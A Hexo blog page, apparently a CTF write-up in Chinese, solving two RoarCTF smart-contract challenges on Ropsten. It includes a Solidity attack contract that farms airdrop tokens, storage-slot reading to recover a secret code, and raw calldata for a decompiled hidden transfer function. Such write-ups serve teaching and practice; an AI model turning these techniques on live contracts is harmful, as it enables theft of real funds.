@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="RoarCTF智能合约题 writeup两则COINFLIP根据题目描述，没有附件，直接看源码：https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code 1.要获取flag，必须账户余额必须大于500ether(注意：这里的ether只是一个单位，10的18次方):1234functio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="RoarCTF智能合约题 writeup两则COINFLIP根据题目描述，没有附件，直接看源码：https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code 1.要获取flag，必须账户余额必须大于500ether(注意：这里的ether只是一个单位，10的18次方):1234functio">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/attachments/107ad97c.png">
+<meta property="og:image" content="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/attachments/13b2e6df.png">
+<meta property="og:image" content="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/attachments/28773450.png">
+<meta property="og:updated_time" content="2019-10-14T04:32:19.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="RoarCTF智能合约题 writeup两则COINFLIP根据题目描述，没有附件，直接看源码：https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code 1.要获取flag，必须账户余额必须大于500ether(注意：这里的ether只是一个单位，10的18次方):1234functio">
+<meta name="twitter:image" content="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/attachments/107ad97c.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/">
+
+
+
+
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yogurt">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-14T12:32:19+08:00">
+                2019-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="RoarCTF智能合约题-writeup两则"><a href="#RoarCTF智能合约题-writeup两则" class="headerlink" title="RoarCTF智能合约题 writeup两则"></a>RoarCTF智能合约题 writeup两则</h1><h2 id="COINFLIP"><a href="#COINFLIP" class="headerlink" title="COINFLIP"></a>COINFLIP</h2><p>根据题目描述，没有附件，直接看源码：<a href="https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code" target="_blank" rel="noopener">https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code</a></p>
+<p>1.要获取flag，必须账户余额必须大于500ether(注意：这里的ether只是一个单位，10的18次方):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">    require (balances[msg.sender] &gt; 500 ether);</span><br><span class="line">    emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.看代码如何获取token，该处有一个空投函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Ap() public &#123;</span><br><span class="line">    if(balances[msg.sender] == 0) &#123;</span><br><span class="line">    balances[msg.sender]+=1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>当账户余额是0时，调用该函数能够获取1ether，那么如果一个账户要有500ether，就有两种方法<br>创建500个账户，分别调用一次该函数，并将获取的token都转到同一个账户X，那么X账户余额就有了500ether，就可以执行CaptureTheFlag。<br>创建一个账户，每调用Ap()一次后将余额转到账户X，再继续调用Ap()，再转账，执行500次。<br>3.攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Hack</span><br><span class="line">&#123;</span><br><span class="line">  P_Bank public pb;</span><br><span class="line">  event Ctflog(address addr_);</span><br><span class="line">  function attack(address target,int len) public&#123;  </span><br><span class="line">    for(int i=0;i&lt;len;i++)&#123;</span><br><span class="line">      pb = P_Bank(target);    //这个放在循环外面就是思路2，放在里面就是思路1，差别不大。</span><br><span class="line">      pb.Ap();</span><br><span class="line">      emit Ctflog(msg.sender);  //msg.sender执行该函数的账户</span><br><span class="line">      pb.Transfer(msg.sender,1 ether);</span><br><span class="line">    &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但由于gas的限制，循环次数可能不能直接设置500，我这里设置200，200，100.</p>
+<p>执行结束后，我的账户里就有了500ether，这时候就可以成功调用CaptureTheFlag，获得flag。<br>flag：RoarCTF{wm-da64ccd4c370ab6a8ee64381cfa14a1e</p>
+<h2 id="合约第二题-Honey-Lock"><a href="#合约第二题-Honey-Lock" class="headerlink" title="合约第二题 Honey Lock"></a>合约第二题 Honey Lock</h2><p>题目给了源码(后来发现是部分)和合约地址：<a href="https://ropsten.etherscan.io/address/0x8d73365bb00a9a1a06100fdfdc22fd8a61cfff93#code" target="_blank" rel="noopener">https://ropsten.etherscan.io/address/0x8d73365bb00a9a1a06100fdfdc22fd8a61cfff93#code</a><br>第一次做比赛题，开始被坑了，以为附件给出的就是全部源码。下面给出解题过程：<br>读附件源码，调用CaptureTheFlag，必须满足两个条件：<br>takeRecord[msg.sender] == true；<br>balances[msg.sender] == 0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">      require (takeRecord[msg.sender] == true);</span><br><span class="line">      require (balances[msg.sender] == 0);</span><br><span class="line">      emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>第一个条件有两个地方可以得到满足：构造函数HoneyLock()和takeMoney()，显然是要调takeMoney()，但是调用该函数后会得到一个空投，<code>balances[owner] = airDrop;</code>,从而无法满足上述的条件2，那么就要找找怎么把账户的余额转出去。看附件代码，有一个transfer()和withdraw() 都可以实现，但是仔细看一下，发现了问题：<br>对于transfer()，加了一个时间转账的条件：<br><code>modifier lock() {
+      require (now &gt; timeHouse[msg.sender]);
+      _;
+    }</code><br>现在的时间必须大于<code>timeHouse[msg.sender]</code>,但是在调用takeMoney()的时候，该变量的时间已经被赋值为一年后：<code>timeHouse[owner] = time;</code>,<code>uint public time = now + 1 years;</code>，因此该函数没法调用。</p>
+<p>对于withdraw() ，要执行成功必须满足两个条件：onlyOwner，和takeRecord[msg.sender] == true，这里第二个条件在调用了takeMoney()之后就已经满足了，主要是第一个，看了一个代码，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  function useCode(uint256 code) public payable &#123;</span><br><span class="line">      require ((code == guessCode) &amp;&amp; (msg.value &gt;= guessValue)); </span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>猜数字，我们知道在区块链里全局变量是可以直接通过getStorage读取的，只要知道变量对应的存储slot就可以，分析一下知道guessCode的slot=5，guessValue的slot=6，用rpc api查看值：<br><img src="attachments/107ad97c.png" alt="107ad97c.png"></p>
+<p>code=0x29a（对应十进制666）,value=0x2386f26fc10000（对应十进制0.01ether），调用useCode，666作为参数，msg.value=0.01ether就可以调用成功，此时 owner 就是 msg.sender了，按道理应该是可以调用withdraw()，可是调用报错。<br>只能改变思路，想起来还有一个transferFrom()也可以转账，这边也没有重写，应该可以通过approve和transferFrom()来转账。操作一波后发现也调用不了。百思不解不得其解，不过就在刚刚写文档的时候想起来了，transferFrom()内部也会调用transfer()啊。<br>这也不行，就想起了给的合约地址，没有源码，就反编译了一波，发现了原来给的不是全部源码呀，而且还有误导的地方，比如onlyOwner这里并不是要owner=msg.sender，而是(msg.sender == storage[4])（这个onlyOwner不知道是不是自己理解有问题，还需要继续看一下）。然后源码里面要有另一个无法反编译出函数名的函数，和transferFrom()有点类似，但是多了一个参数，这个参数对该转账加了一个限制条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//https://ropsten.etherscan.io反编译的伪代码</span><br><span class="line">function 5ad0ae39() public &#123;</span><br><span class="line">    require((_arg2 &lt;= allowance[_arg0]));</span><br><span class="line">    require(((storage[2] + msg.sender) == _arg3));</span><br><span class="line">    balanceOf[_arg0] -= _arg2;</span><br><span class="line">    balanceOf[_arg1] = (balanceOf[_arg1] + _arg2);</span><br><span class="line">    allowance[_arg0] -= _arg2;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>限制条件就是storage[2] + msg.sender == _arg3，storage[2]的内容对应十进制是53231323（出题人莫不是在玩吉他的时候想出的题？），也就是说第四个参数是msg.sende加上53231323。</p>
+<p> 调用5ad0ae39() 之前需要调用approve()，把账户A的余额委托给B，然后由B调用5ad0ae39()将A的钱转给C，简单一点，就将账户A余额委托给A，然后A调用5ad0ae39()将钱转给地址0x00：<br>这个approve()的调用可以直接在remix里面进行：<br><img src="attachments/13b2e6df.png" alt="13b2e6df.png"></p>
+<p>5ad0ae39()需要用api，先把data整理一下：函数名+四个参数：<br>0x5ad0ae39000000000000000000000000967f8ac6502ecba2635d9e4eea2f65ad4940b1b1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e8000000000000000000000000967f8ac6502ecba2635d9e4eea2f65ad4c6cf08c</p>
+<p>然后在console里调用eth.sendTransaction()：<br><img src="attachments/28773450.png" alt="28773450.png"></p>
+<p>metamask会弹出转账窗口，调整gas数就等待交易完成了。<br>这边开始用的sendSignedTransaction(),但始终不成功，不知道有没有大佬熟悉这个接口调用的，指导一下。</p>
+<p>到这里就满足takeRecord[msg.sender] == true并且账户余额为0,可以调用CaptureTheFlag方法，坐等flag。<br>flag：RoarCTF{wm-87fc255216991be9173a59aa8b6845a0}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/19/以太坊智能合约opcode分析入门 partII/" rel="next" title="以太坊智能合约opcode分析入门 partII">
+                <i class="fa fa-chevron-left"></i> 以太坊智能合约opcode分析入门 partII
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">yogurt</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF智能合约题-writeup两则"><span class="nav-number">1.</span> <span class="nav-text">RoarCTF智能合约题 writeup两则</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#COINFLIP"><span class="nav-number">1.1.</span> <span class="nav-text">COINFLIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#合约第二题-Honey-Lock"><span class="nav-number">1.2.</span> <span class="nav-text">合约第二题 Honey Lock</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yogurt</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
